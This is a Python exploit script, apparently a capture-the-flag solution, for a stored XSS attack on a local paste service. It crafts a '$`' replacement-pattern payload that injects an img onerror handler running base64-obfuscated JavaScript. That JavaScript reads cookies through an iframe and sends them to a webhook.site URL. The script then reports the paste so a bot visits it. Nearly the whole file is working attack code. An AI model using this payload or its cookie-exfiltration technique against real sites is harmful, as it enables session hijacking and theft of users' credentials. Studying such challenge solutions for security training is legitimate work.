import base64

import requests

# sample payload: <img src="abc$`<img src=x onerror=<JS_CODE>>">
URL = "http://localhost:3000"
webhook = "https://webhook.site/cbd53765-d5a5-4e15-97ac-dab9e15d7cbc"
js_code = f'''
    let ifr = document.createElement('iframe');
    ifr.src = "/hidden/404";
    ifr.onload = () => {{
        let c = ifr.contentDocument.cookie;
        window.location= "{webhook}?c=" + encodeURIComponent(c);
    }}
    document.body.appendChild(ifr);
'''.replace("\n", "")
js_code = base64.b64encode(js_code.encode()).decode()
js_code = f"eval(atob('{js_code}'))"
# payload = f'<img src="abc$`<img src=x onerror="{js_code}">">'
# use title instead of src to bypass url encode
payload = f'<p title="$` <img src=x onerror={js_code}>"></p>'

session = requests.Session()
response = session.post(URL+"/create", data={"content": payload}, allow_redirects=False)
if response.status_code == 302:
    print("Response:", response.text[:40])
    paste = URL + response.headers["Location"]
    print("Paste URL:", paste)
    response = session.post(url=URL+'/report', data={"url": paste})
    print("Report response:", response.status_code, response.text)
else:
    print("Failed to create paste:", response.status_code, response.text)
